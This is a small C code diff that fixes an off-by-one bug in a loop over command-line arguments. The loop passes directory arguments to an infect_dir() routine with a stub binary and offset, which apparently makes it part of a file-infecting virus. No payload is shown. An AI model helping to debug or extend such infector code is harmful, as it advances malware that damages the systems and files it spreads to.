@@ -47,7 +47,7 @@ int main(int argc, char **argv) {
 	if (argc > 1)
 	{
 		int i = 1;
-		while (i <= argc)
+		while (i < argc)
 		{
 			if (argv[i][strlen(argv[i]) - 1] == '/')
 				infect_dir(argv[i], stub_bin, stub_bin_len, offset);
